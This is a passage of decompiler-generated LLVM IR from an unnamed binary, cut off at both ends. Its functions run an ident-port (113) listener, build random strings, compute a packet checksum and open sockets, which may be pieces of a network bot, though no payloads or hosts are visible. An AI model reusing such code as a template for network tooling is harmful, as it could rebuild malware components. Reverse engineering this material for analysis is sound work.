  uselistorder label %dec_label_pc_8484, { 1, 0 }
}

define i32 @function_8548() local_unnamed_addr {
dec_label_pc_8548:
  %v2_855c = load i8*, i8** @global_var_18478.33, align 4
  %v3_855c = ptrtoint i8* %v2_855c to i32
  %v2_8560 = icmp eq i8* %v2_855c, null
  br i1 %v2_8560, label %dec_label_pc_8568, label %dec_label_pc_8578

dec_label_pc_8568:                                ; preds = %dec_label_pc_8548
  %v0_8568 = call i32 @function_fe50()
  br label %dec_label_pc_85e4

dec_label_pc_8578:                                ; preds = %dec_label_pc_8548
  %v2_857c = load i32, i32* @global_var_1847c.35, align 4
  %v7_8580 = icmp eq i32 %v2_857c, 1
  br i1 %v7_8580, label %dec_label_pc_8588, label %dec_label_pc_85a0

dec_label_pc_8588:                                ; preds = %dec_label_pc_8578
  %v2_8594 = call i32 @function_f238(i32 %v3_855c)
  br label %dec_label_pc_85e4

dec_label_pc_85a0:                                ; preds = %dec_label_pc_8578
  %v0_85a0 = call i32 @function_fe50()
  %v2_85b0 = load i32, i32* @global_var_1847c.35, align 4
  %v2_85bc = call i32 @function_c864(i32 %v0_85a0, i32 %v2_85b0)
  %v2_85cc = load i8*, i8** @global_var_18478.33, align 4
  %v3_85cc = ptrtoint i8* %v2_85cc to i32
  %v2_85d0 = add i32 %v2_85bc, 1
  %v1_85d4 = add i32 %v2_85d0, %v3_85cc
  %v1_85dc = call i32 @function_f238(i32 %v1_85d4)
  br label %dec_label_pc_85e4

dec_label_pc_85e4:                                ; preds = %dec_label_pc_8588, %dec_label_pc_8568, %dec_label_pc_85a0
  %v3_85e4 = phi i32 [ %v2_8594, %dec_label_pc_8588 ], [ %v0_8568, %dec_label_pc_8568 ], [ %v1_85dc, %dec_label_pc_85a0 ]
  ret i32 %v3_85e4

; uselistorder directives
  uselistorder i32 (i32)* @function_f238, { 1, 0 }
  uselistorder label %dec_label_pc_85e4, { 2, 0, 1 }
}

define i32 @function_85f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_85f8:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_85f8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_85f8, i32* @ip, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8634

dec_label_pc_8610:                                ; preds = %dec_label_pc_865c, %dec_label_pc_8634
  %v3_8610 = phi i32 [ %v3_866c, %dec_label_pc_865c ], [ %v3_8644, %dec_label_pc_8634 ]
  store i32 %v3_8610, i32* @r0, align 4
  %v0_8614 = call i32 @function_ecc0()
  %v3_8620 = load i32, i32* %stack_var_-20, align 4
  %v2_8624 = add i32 %v0_8614, -1
  %v1_8628 = add i32 %v2_8624, %v3_8620
  %v3_8630 = inttoptr i32 %v1_8628 to i8*
  store i8 0, i8* %v3_8630, align 1
  %v3_8634.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8634

dec_label_pc_8634:                                ; preds = %dec_label_pc_85f8, %dec_label_pc_8610
  %v3_8634 = phi i32 [ %arg1, %dec_label_pc_85f8 ], [ %v3_8634.pre, %dec_label_pc_8610 ]
  store i32 %v3_8634, i32* @r0, align 4
  %v0_8638 = call i32 @function_ecc0()
  %v3_8644 = load i32, i32* %stack_var_-20, align 4
  %v2_8648 = add i32 %v0_8638, -1
  %v1_864c = add i32 %v2_8648, %v3_8644
  %v1_8650 = inttoptr i32 %v1_864c to i8*
  %v2_8650 = load i8, i8* %v1_8650, align 1
  %v7_8654 = icmp eq i8 %v2_8650, 13
  br i1 %v7_8654, label %dec_label_pc_8610, label %dec_label_pc_865c

dec_label_pc_865c:                                ; preds = %dec_label_pc_8634
  store i32 %v3_8644, i32* @r0, align 4
  %v0_8660 = call i32 @function_ecc0()
  %v3_866c = load i32, i32* %stack_var_-20, align 4
  %v2_8670 = add i32 %v0_8660, -1
  %v1_8674 = add i32 %v2_8670, %v3_866c
  %v1_8678 = inttoptr i32 %v1_8674 to i8*
  %v2_8678 = load i8, i8* %v1_8678, align 1
  %v7_867c = icmp eq i8 %v2_8678, 10
  br i1 %v7_867c, label %dec_label_pc_8610, label %dec_label_pc_8684

dec_label_pc_8684:                                ; preds = %dec_label_pc_865c
  ret i32 %v0_8660

; uselistorder directives
  uselistorder i32 %v3_866c, { 1, 0 }
  uselistorder i32 %v3_8644, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_8634, { 1, 0 }
}

define i32 @function_8688() local_unnamed_addr {
dec_label_pc_8688:
  %stack_var_-1064 = alloca i32, align 4
  %v3_868c = load i32, i32* @r4, align 4
  %v6_868c = load i32, i32* @fp, align 4
  %v2_8698 = ptrtoint i32* %stack_var_-1064 to i32
  %v0_869c = call i32 @function_fe50()
  %v2_86ac = call i32 @function_c930(i32 %v0_869c, i32 5)
  %v1_86b4 = add i32 %v2_86ac, 4
  %v1_86c0 = add i32 %v2_86ac, 5
  %v1_86c8 = call i32 @function_f908(i32 %v1_86c0)
  store i32 %v1_86c0, i32* @r2, align 4
  %v2_86ec = inttoptr i32 %v1_86c8 to i8*
  %v3_86ec = call i32 @function_ec20(i8* %v2_86ec, i32 0)
  store i32 ptrtoint ([16 x i8]* @global_var_157ac.37 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_157bc.39 to i32), i32* @r1, align 4
  %v3_86f8 = call i32 @function_cd94(i32 ptrtoint ([16 x i8]* @global_var_157ac.37 to i32), i32 ptrtoint (i32* @global_var_157bc.39 to i32))
  %v2_8708 = icmp eq i32 %v3_86f8, 0
  br i1 %v2_8708, label %dec_label_pc_8760.preheader, label %dec_label_pc_8774

dec_label_pc_8760.preheader:                      ; preds = %dec_label_pc_8688
  %v5_876c22 = icmp sgt i32 %v1_86b4, 0
  br i1 %v5_876c22, label %dec_label_pc_871c, label %dec_label_pc_8850

dec_label_pc_871c:                                ; preds = %dec_label_pc_8760.preheader, %dec_label_pc_871c
  %storemerge323 = phi i32 [ %v1_8758, %dec_label_pc_871c ], [ 0, %dec_label_pc_8760.preheader ]
  %v2_8728 = add i32 %storemerge323, %v1_86c8
  store i32 %v2_8728, i32* @r4, align 4
  %v0_872c = call i32 @function_fe50()
  %v2_873c = call i32 @function_c930(i32 %v0_872c, i32 26)
  %fold = add i32 %v2_873c, 65
  %v1_8750 = trunc i32 %fold to i8
  %v2_8750 = load i32, i32* @r4, align 4
  %v3_8750 = inttoptr i32 %v2_8750 to i8*
  store i8 %v1_8750, i8* %v3_8750, align 1
  %v1_8758 = add nuw nsw i32 %storemerge323, 1
  %v5_876c = icmp slt i32 %v1_8758, %v1_86b4
  br i1 %v5_876c, label %dec_label_pc_871c, label %dec_label_pc_8850

dec_label_pc_8774:                                ; preds = %dec_label_pc_8688
  %v0_8774 = call i32 @function_fe50()
  store i32 %v0_8774, i32* @r4, align 4
  %v0_877c = call i32 @function_fe50()
  %v0_8784 = load i32, i32* @r4, align 4
  %v2_8784 = mul i32 %v0_8784, %v0_877c
  %v2_8794 = call i32 @function_c930(i32 %v2_8784, i32 45402)
  %v1_879c = add i32 %v2_8794, 1
  %v5_87e030 = icmp sgt i32 %v1_879c, 0
  br i1 %v5_87e030, label %dec_label_pc_87b0, label %dec_label_pc_87e4

dec_label_pc_87b0:                                ; preds = %dec_label_pc_8774, %dec_label_pc_87b0
  %storemerge231 = phi i32 [ %v1_87cc, %dec_label_pc_87b0 ], [ 0, %dec_label_pc_8774 ]
  %v3_87c4 = call i32 @function_e500(i32 %v2_8698, i32 1024, i32 %v3_86f8)
  %v1_87cc = add nuw nsw i32 %storemerge231, 1
  %v5_87e0 = icmp slt i32 %v1_87cc, %v1_879c
  br i1 %v5_87e0, label %dec_label_pc_87b0, label %dec_label_pc_87e4

dec_label_pc_87e4:                                ; preds = %dec_label_pc_87b0, %dec_label_pc_8774
  store i32 1024, i32* @r2, align 4
  %v2_87f8 = bitcast i32* %stack_var_-1064 to i8*
  %v3_87f8 = call i32 @function_ec20(i8* %v2_87f8, i32 0)
  %v3_8810 = call i32 @function_e500(i32 %v2_8698, i32 1024, i32 %v3_86f8)
  %v1_8820 = call i32 @function_85f8(i32 %v2_8698)
  store i32 %v1_86c8, i32* @r0, align 4
  store i32 %v2_8698, i32* @r1, align 4
  store i32 %v1_86b4, i32* @r2, align 4
  %v0_8844 = call i32 @function_ec10()
  %v1_884c = inttoptr i32 %v3_86f8 to i8*
  %v2_884c = call i32 @function_cc14(i8* %v1_884c)
  br label %dec_label_pc_8850

dec_label_pc_8850:                                ; preds = %dec_label_pc_8760.preheader, %dec_label_pc_871c, %dec_label_pc_87e4
  store i32 %v3_868c, i32* @r4, align 4
  store i32 %v6_868c, i32* @fp, align 4
  ret i32 %v1_86c8

; uselistorder directives
  uselistorder i32 %v1_87cc, { 1, 0 }
  uselistorder i32 %v1_879c, { 1, 0 }
  uselistorder i32 %v1_8758, { 1, 0 }
  uselistorder i32 %v1_86c8, { 2, 1, 0, 3 }
  uselistorder i32 %v1_86b4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8850, { 2, 1, 0 }
  uselistorder label %dec_label_pc_87b0, { 1, 0 }
  uselistorder label %dec_label_pc_871c, { 1, 0 }
}

define i32 @function_8868(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8868:
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1108 = alloca i32, align 4
  %stack_var_-1236 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_886c = load i32, i32* @fp, align 4
  store i32 %v3_886c, i32* %stack_var_-16, align 4
  store i32 34932, i32* %stack_var_-4, align 4
  %v13_886c = ptrtoint i32* %stack_var_-16 to i32
  %v2_8870 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8870, i32* @fp, align 4
  %v3_8888 = call i32 @function_f8dc(i32 2, i32 1, i32 0)
  %v7_8898 = icmp eq i32 %v3_8888, -1
  br i1 %v7_8898, label %dec_label_pc_8c38, label %dec_label_pc_88a0

dec_label_pc_88a0:                                ; preds = %dec_label_pc_8868
  store i32 2, i32* %stack_var_-60, align 4
  %v1_88b4 = call i32 @function_f294(i32 113)
  %sext = mul i32 %v1_88b4, 16777216
  %v1_88b8 = sdiv i32 %sext, 16777216
  %v2_88d0 = ptrtoint i32* %stack_var_-60 to i32
  %v10_88f8 = ashr i32 %sext, 31
  %v11_88f8 = bitcast i32* %stack_var_-60 to %sockaddr*
  %v12_88f8 = call i32 @function_f7c8(i32 %v3_8888, %sockaddr* %v11_88f8, i32 16, i32 %v2_88d0, i32 %v1_88b8, i32 %v10_88f8, i32 0, i32 0, i32 0)
  %v7_8900 = icmp eq i32 %v12_88f8, -1
  br i1 %v7_8900, label %dec_label_pc_8c38, label %dec_label_pc_8908

dec_label_pc_8908:                                ; preds = %dec_label_pc_88a0
  %v2_8910 = call i32 @function_f820(i32 %v3_8888, i32 1)
  %v7_8918 = icmp eq i32 %v2_8910, -1
  br i1 %v7_8918, label %dec_label_pc_8c38, label %dec_label_pc_8920

dec_label_pc_8920:                                ; preds = %dec_label_pc_8908
  %v1_8920 = call i32 @function_ca44(i32 %v2_8910)
  %v2_8928 = icmp eq i32 %v1_8920, 0
  br i1 %v2_8928, label %dec_label_pc_8c38, label %dec_label_pc_8930

dec_label_pc_8930:                                ; preds = %dec_label_pc_8920
  store i32 16, i32* %stack_var_-44, align 4
  %v2_8938 = ptrtoint i32* %stack_var_-76 to i32
  %v2_893c = ptrtoint i32* %stack_var_-44 to i32
  %v5_8948 = bitcast i32* %stack_var_-76 to %sockaddr*
  %v6_8948 = call i32 @function_f79c(i32 %v3_8888, %sockaddr* %v5_8948, i32 %v2_893c, i32 %v2_8938, i32 16)
  %v2_8958 = add i32 %v6_8948, 1
  %v3_8958 = icmp eq i32 %v6_8948, -1
  br i1 %v3_8958, label %dec_label_pc_8960, label %dec_label_pc_8968.preheader

dec_label_pc_8960:                                ; preds = %dec_label_pc_8930
  %v1_8964 = call i32 @function_10500(i32 0)
  br label %dec_label_pc_8968.preheader

dec_label_pc_8968.preheader:                      ; preds = %dec_label_pc_8960, %dec_label_pc_8930
  %v2_8970 = ptrtoint i32* %stack_var_-1236 to i32
  %v3_89b0 = udiv i32 %v6_8948, 32
  %v3_89c4 = mul nuw nsw i32 %v3_89b0, 4
  %v2_89cc = add i32 %v3_89c4, %v13_886c
  %v1_89dc = urem i32 %v6_8948, 32
  %v6_89e4 = shl i32 1, %v1_89dc
  %v2_8a34 = ptrtoint i32* %stack_var_-1108 to i32
  %v2_8a80 = add i32 %v2_89cc, -1220
  %v1_8a84 = inttoptr i32 %v2_8a80 to i32*
  br label %dec_label_pc_8984.lr.ph

dec_label_pc_8984.lr.ph:                          ; preds = %dec_label_pc_8a64, %dec_label_pc_8968.preheader
  br label %dec_label_pc_8984

dec_label_pc_8984:                                ; preds = %dec_label_pc_8984.lr.ph, %dec_label_pc_8984
  %storemerge28 = phi i32 [ 0, %dec_label_pc_8984.lr.ph ], [ %v1_8998, %dec_label_pc_8984 ]
  %v5_8990 = mul nuw nsw i32 %storemerge28, 4
  %v6_8990 = add i32 %v5_8990, %v2_8970
  %v7_8990 = inttoptr i32 %v6_8990 to i32*
  store i32 0, i32* %v7_8990, align 4
  %v1_8998 = add nuw nsw i32 %storemerge28, 1
  %tmp38 = icmp ult i32 %v1_8998, 32
  br i1 %tmp38, label %dec_label_pc_8984, label %dec_label_pc_89ac

dec_label_pc_89ac:                                ; preds = %dec_label_pc_8984
  %v2_89d4 = load i32, i32* %v1_8a84, align 4
  %v2_89e8 = or i32 %v2_89d4, %v6_89e4
  store i32 %v2_89e8, i32* %v1_8a84, align 4
  store i32 60, i32* %stack_var_-1108, align 4
  %v5_8a4c = call i32 @function_cb44(i32 %v2_8958, i32 %v2_8970, i32 0, i32 0, i32 %v2_8a34)
  %v1_8a54 = icmp slt i32 %v5_8a4c, 0
  br i1 %v1_8a54, label %dec_label_pc_8a5c, label %dec_label_pc_8a64

dec_label_pc_8a5c:                                ; preds = %dec_label_pc_89ac
  %v1_8a60 = call i32 @function_10500(i32 0)
  br label %dec_label_pc_8a64

dec_label_pc_8a64:                                ; preds = %dec_label_pc_89ac, %dec_label_pc_8a5c
  %v2_8a84 = load i32, i32* %v1_8a84, align 4
  %v6_8a901 = lshr i32 %v2_8a84, %v1_89dc
  %v1_8a98 = urem i32 %v6_8a901, 2
  %v2_8a9c = icmp eq i32 %v1_8a98, 0
  br i1 %v2_8a9c, label %dec_label_pc_8984.lr.ph, label %dec_label_pc_8aa8

dec_label_pc_8aa8:                                ; preds = %dec_label_pc_8a64
  %v2_8ab0 = ptrtoint i32* %stack_var_-1100 to i32
  %v5_8ac4 = call i32 @function_f84c(i32 %v6_8948, i32* nonnull %stack_var_-1100, i32 1024, i32 0)
  %tmp39 = icmp slt i32 %v5_8ac4, 1
  br i1 %tmp39, label %dec_label_pc_8ae8, label %dec_label_pc_8adc

dec_label_pc_8adc:                                ; preds = %dec_label_pc_8aa8
  %v7_8ae4 = icmp slt i32 %v5_8ac4, 20
  br i1 %v7_8ae4, label %dec_label_pc_8af0, label %dec_label_pc_8ae8

dec_label_pc_8ae8:                                ; preds = %dec_label_pc_8adc, %dec_label_pc_8aa8
  %v1_8aec = call i32 @function_10500(i32 0)
  br label %dec_label_pc_8af0

dec_label_pc_8af0:                                ; preds = %dec_label_pc_8adc, %dec_label_pc_8ae8
  %v2_8b00 = add i32 %v13_886c, -1084
  %v2_8b04 = add i32 %v2_8b00, %v5_8ac4
  %v3_8b0c = inttoptr i32 %v2_8b04 to i8*
  store i8 0, i8* %v3_8b0c, align 1
  %v1_8b14 = add i32 %v13_886c, -1
  %v2_8b24 = add i32 %v1_8b14, %v5_8ac4
  %v2_8b28 = add i32 %v2_8b24, -1084
  %v1_8b2c = inttoptr i32 %v2_8b28 to i8*
  %v2_8b2c = load i8, i8* %v1_8b2c, align 1
  %v7_8b30 = icmp eq i8 %v2_8b2c, 10
  br i1 %v7_8b30, label %dec_label_pc_8b60, label %dec_label_pc_8b38

dec_label_pc_8b38:                                ; preds = %dec_label_pc_8af0
  %v2_8b54 = load i8, i8* %v1_8b2c, align 1
  %v7_8b58 = icmp eq i8 %v2_8b54, 13
  br i1 %v7_8b58, label %dec_label_pc_8b60, label %dec_label_pc_8b84

dec_label_pc_8b60:                                ; preds = %dec_label_pc_8b38, %dec_label_pc_8af0
  store i8 0, i8* %v1_8b2c, align 1
  br label %dec_label_pc_8b84

dec_label_pc_8b84:                                ; preds = %dec_label_pc_8b38, %dec_label_pc_8b60
  %v1_8b88 = add i32 %v13_886c, -2
  %v2_8b98 = add i32 %v1_8b88, %v5_8ac4
  %v2_8b9c = add i32 %v2_8b98, -1084
  %v1_8ba0 = inttoptr i32 %v2_8b9c to i8*
  %v2_8ba0 = load i8, i8* %v1_8ba0, align 1
  %v7_8ba4 = icmp eq i8 %v2_8ba0, 10
  br i1 %v7_8ba4, label %dec_label_pc_8bd4, label %dec_label_pc_8bac

dec_label_pc_8bac:                                ; preds = %dec_label_pc_8b84
  %v2_8bc8 = load i8, i8* %v1_8ba0, align 1
  %v7_8bcc = icmp eq i8 %v2_8bc8, 13
  br i1 %v7_8bcc, label %dec_label_pc_8bd4, label %dec_label_pc_8bf8

dec_label_pc_8bd4:                                ; preds = %dec_label_pc_8bac, %dec_label_pc_8b84
  store i8 0, i8* %v1_8ba0, align 1
  br label %dec_label_pc_8bf8

dec_label_pc_8bf8:                                ; preds = %dec_label_pc_8bac, %dec_label_pc_8bd4
  store i32 %v2_8ab0, i32* @r2, align 4
  %v3_8c1c = call i32 @function_8374(i32 %v6_8948, i32 ptrtoint ([25 x i8]* @global_var_157c0.43 to i32))
  %v1_8c24 = call i32 @function_ca18(i32 %v6_8948)
  %v1_8c2c = call i32 @function_ca18(i32 %v3_8888)
  %v1_8c34 = call i32 @function_10500(i32 0)
  br label %dec_label_pc_8c38

dec_label_pc_8c38:                                ; preds = %dec_label_pc_8920, %dec_label_pc_8908, %dec_label_pc_88a0, %dec_label_pc_8868, %dec_label_pc_8bf8
  %v9_8c3c = phi i32 [ 0, %dec_label_pc_8920 ], [ %v2_8910, %dec_label_pc_8908 ], [ %v12_88f8, %dec_label_pc_88a0 ], [ %v3_8888, %dec_label_pc_8868 ], [ %v1_8c34, %dec_label_pc_8bf8 ]
  ret i32 %v9_8c3c

; uselistorder directives
  uselistorder i8* %v1_8ba0, { 1, 0, 2 }
  uselistorder i8* %v1_8b2c, { 1, 0, 2 }
  uselistorder i32 %storemerge28, { 1, 0 }
  uselistorder i32* %v1_8a84, { 2, 0, 1 }
  uselistorder i32 %v1_89dc, { 1, 0 }
  uselistorder i32 %v2_8970, { 1, 0 }
  uselistorder i32 %v6_8948, { 2, 3, 4, 1, 0, 6, 5 }
  uselistorder i32 %v2_8910, { 1, 2, 0 }
  uselistorder i32 %v12_88f8, { 1, 0 }
  uselistorder i32 %v3_8888, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v13_886c, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 0, 2, 1 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder label %dec_label_pc_8c38, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8bf8, { 1, 0 }
  uselistorder label %dec_label_pc_8b84, { 1, 0 }
  uselistorder label %dec_label_pc_8af0, { 1, 0 }
  uselistorder label %dec_label_pc_8a64, { 1, 0 }
  uselistorder label %dec_label_pc_8984, { 1, 0 }
}

define i32 @function_8c48(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8c48:
  %stack_var_-4 = alloca i32, align 4
  store i32 35924, i32* %stack_var_-4, align 4
  %v2_8c50 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8c50, i32* @fp, align 4
  %v2_8c64 = icmp eq i32 %arg2, 0
  br i1 %v2_8c64, label %dec_label_pc_8c6c, label %dec_label_pc_8c78

dec_label_pc_8c6c:                                ; preds = %dec_label_pc_8c48
  br label %dec_label_pc_8cb4

dec_label_pc_8c78:                                ; preds = %dec_label_pc_8c48
  %v7_8c7c = icmp eq i32 %arg2, 1
  br i1 %v7_8c7c, label %dec_label_pc_8c84, label %dec_label_pc_8c90

dec_label_pc_8c84:                                ; preds = %dec_label_pc_8c78
  br label %dec_label_pc_8cb4

dec_label_pc_8c90:                                ; preds = %dec_label_pc_8c78
  %v1_8c7c = add i32 %arg2, -1
  %v2_8ca0 = call i32 @function_8c48(i32 %arg1, i32 %v1_8c7c)
  %v2_8cac = mul i32 %v2_8ca0, %arg1
  br label %dec_label_pc_8cb4

dec_label_pc_8cb4:                                ; preds = %dec_label_pc_8c84, %dec_label_pc_8c6c, %dec_label_pc_8c90
  %v3_8cb4 = phi i32 [ %arg1, %dec_label_pc_8c84 ], [ 1, %dec_label_pc_8c6c ], [ %v2_8cac, %dec_label_pc_8c90 ]
  ret i32 %v3_8cb4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8cb4, { 2, 0, 1 }
}

define i32 @function_8cc4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8cc4:
  %v8_8d4011 = icmp sgt i32 %arg2, 1
  br i1 %v8_8d4011, label %dec_label_pc_8d04, label %dec_label_pc_8d44

dec_label_pc_8d04:                                ; preds = %dec_label_pc_8cc4, %dec_label_pc_8d04
  %v3_8d2c = phi i32 [ %v1_8d30, %dec_label_pc_8d04 ], [ %arg2, %dec_label_pc_8cc4 ]
  %stack_var_-36.013 = phi i8* [ %v5_8d28, %dec_label_pc_8d04 ], [ %arg1, %dec_label_pc_8cc4 ]
  %stack_var_-32.012 = phi i32 [ %v2_8d18, %dec_label_pc_8d04 ], [ 0, %dec_label_pc_8cc4 ]
  %v4_8d04 = ptrtoint i8* %stack_var_-36.013 to i32
  %v2_8d08 = load i8, i8* %stack_var_-36.013, align 1
  %v3_8d08 = zext i8 %v2_8d08 to i32
  %v1_8d0c = add i32 %v4_8d04, 1
  %v2_8d0c = inttoptr i32 %v1_8d0c to i8*
  %v3_8d0c = load i8, i8* %v2_8d0c, align 1
  %v4_8d0c = zext i8 %v3_8d0c to i32
  %v4_8d10 = mul nuw nsw i32 %v4_8d0c, 256
  %v5_8d10 = or i32 %v4_8d10, %v3_8d08
  %v2_8d18 = add i32 %v5_8d10, %stack_var_-32.012
  %v1_8d24 = add i32 %v4_8d04, 2
  %v5_8d28 = inttoptr i32 %v1_8d24 to i8*
  %v1_8d30 = add nsw i32 %v3_8d2c, -2
  %v8_8d40 = icmp sgt i32 %v1_8d30, 1
  br i1 %v8_8d40, label %dec_label_pc_8d04, label %dec_label_pc_8d44

dec_label_pc_8d44:                                ; preds = %dec_label_pc_8d04, %dec_label_pc_8cc4
  %v3_8d44 = phi i32 [ %arg2, %dec_label_pc_8cc4 ], [ %v1_8d30, %dec_label_pc_8d04 ]
  %stack_var_-32.0.lcssa = phi i32 [ 0, %dec_label_pc_8cc4 ], [ %v2_8d18, %dec_label_pc_8d04 ]
  %stack_var_-36.0.lcssa = phi i8* [ %arg1, %dec_label_pc_8cc4 ], [ %v5_8d28, %dec_label_pc_8d04 ]
  %v7_8d48 = icmp eq i32 %v3_8d44, 1
  br i1 %v7_8d48, label %dec_label_pc_8d50, label %dec_label_pc_8d7c

dec_label_pc_8d50:                                ; preds = %dec_label_pc_8d44
  %v2_8d58 = load i8, i8* %stack_var_-36.0.lcssa, align 1
  %v3_8d64 = sext i8 %v2_8d58 to i32
  %v2_8d74 = add i32 %v3_8d64, %stack_var_-32.0.lcssa
  br label %dec_label_pc_8d7c

dec_label_pc_8d7c:                                ; preds = %dec_label_pc_8d44, %dec_label_pc_8d50
  %stack_var_-32.1 = phi i32 [ %v2_8d74, %dec_label_pc_8d50 ], [ %stack_var_-32.0.lcssa, %dec_label_pc_8d44 ]
  %v3_8d80 = sdiv i32 %stack_var_-32.1, 65536
  %v3_8d8c = urem i32 %stack_var_-32.1, 65536
  %v2_8d90 = add nsw i32 %v3_8d80, %v3_8d8c
  %v3_8d9c = sdiv i32 %v2_8d90, 65536
  %v2_8da4 = add nsw i32 %v3_8d9c, %v2_8d90
  %v2_8da4.not = or i32 %v2_8da4, -65536
  %v1_8db8 = xor i32 %v2_8da4.not, 65535
  %v3_8dd03 = and i32 %v1_8db8, 65280
  %sext = mul i32 %v1_8db8, 16777216
  %v3_8ddc = sdiv i32 %sext, 16777216
  %v5_8de4 = or i32 %v3_8ddc, %v3_8dd03
  ret i32 %v5_8de4

; uselistorder directives
  uselistorder i32 %v2_8d90, { 1, 0 }
  uselistorder i32 %stack_var_-32.1, { 1, 0 }
  uselistorder i32 %stack_var_-32.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_8d30, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8d7c, { 1, 0 }
  uselistorder label %dec_label_pc_8d04, { 1, 0 }
}

define i32 @function_8df4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8df4:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-5200 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-1104 = alloca i32, align 4
  %stack_var_-5216 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_8df8 = load i32, i32* @r4, align 4
  store i32 %v3_8df8, i32* %stack_var_-20, align 4
  store i32 36352, i32* %stack_var_-4, align 4
  %v16_8df8 = ptrtoint i32* %stack_var_-20 to i32
  %v2_8dfc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8dfc, i32* @fp, align 4
  %v3_8e14 = add i32 %v16_8df8, -5184
  %v4_8e14 = inttoptr i32 %v3_8e14 to i32*
  store i32 %arg1, i32* %v4_8e14, align 4
  store i32 %v16_8df8, i32* @lr, align 4
  store i32 %arg4, i32* %stack_var_-5216, align 4
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v1_8e58 = call i32 @function_83d8(i32 %arg2)
  %v2_8e60 = icmp eq i32 %v1_8e58, 0
  br i1 %v2_8e60, label %dec_label_pc_8e68, label %dec_label_pc_9530

dec_label_pc_8e68:                                ; preds = %dec_label_pc_8df4
  %v8_8e7c = icmp sgt i32 %arg3, 1
  br i1 %v8_8e7c, label %dec_label_pc_8eb0, label %dec_label_pc_8e80

dec_label_pc_8e80:                                ; preds = %dec_label_pc_8e68
  %v4_8e94 = load i32, i32* %v4_8e14, align 4
  store i32 ptrtoint ([33 x i8]* @global_var_157dc.45 to i32), i32* %r1.global-to-local, align 4
  store i32 %v16_8df8, i32* @lr, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_8ea4 = call i32 @function_8374(i32 %v4_8e94, i32 ptrtoint ([33 x i8]* @global_var_157dc.45 to i32))
  %v1_8eac = call i32 @function_10500(i32 0)
  br label %dec_label_pc_8eb0

dec_label_pc_8eb0:                                ; preds = %dec_label_pc_8e68, %dec_label_pc_8e80
  store i32 1, i32* %r1.global-to-local, align 4
  %v3_8ebc = call i32 @function_f8dc(i32 2, i32 1, i32 0)
  %v3_8ecc = icmp eq i32 %v3_8ebc, -1
  br i1 %v3_8ecc, label %dec_label_pc_8ed4, label %dec_label_pc_8f04

dec_label_pc_8ed4:                                ; preds = %dec_label_pc_8eb0
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v4_8ee8 = load i32, i32* %v4_8e14, align 4
  store i32 ptrtoint ([37 x i8]* @global_var_15800.47 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_8ef8 = call i32 @function_8374(i32 %v4_8ee8, i32 ptrtoint ([37 x i8]* @global_var_15800.47 to i32))
  %v1_8f00 = call i32 @function_10500(i32 0)
  br label %dec_label_pc_8f04

dec_label_pc_8f04:                                ; preds = %dec_label_pc_8eb0, %dec_label_pc_8ed4
  %v4_8f10 = load i32, i32* %stack_var_-5216, align 4
  %v1_8f14 = add i32 %v4_8f10, 4
  %v1_8f18 = inttoptr i32 %v1_8f14 to i32*
  %v2_8f18 = load i32, i32* %v1_8f18, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_15828.49 to i32), i32* @r1, align 4
  %v4_8f28 = inttoptr i32 %v2_8f18 to i8*
  %v5_8f28 = call i32 @function_ed3c(i8* %v4_8f28, i32 ptrtoint ([8 x i8]* @global_var_15828.49 to i32), i32 7)
  %v2_8f30 = icmp eq i32 %v5_8f28, 0
  br i1 %v2_8f30, label %dec_label_pc_8f38, label %dec_label_pc_8f6c

dec_label_pc_8f38:                                ; preds = %dec_label_pc_8f04
  store i32 %v16_8df8, i32* @lr, align 4
  %v4_8f44 = load i32, i32* %stack_var_-5216, align 4
  %v1_8f48 = add i32 %v4_8f44, 4
  %v1_8f4c = inttoptr i32 %v1_8f48 to i32*
  %v2_8f4c = load i32, i32* %v1_8f4c, align 4
  %v1_8f50 = add i32 %v2_8f4c, 7
  %v2_8f58 = ptrtoint i32* %stack_var_-1104 to i32
  store i32 %v1_8f50, i32* %r1.global-to-local, align 4
  %v2_8f64 = inttoptr i32 %v1_8f50 to i8*
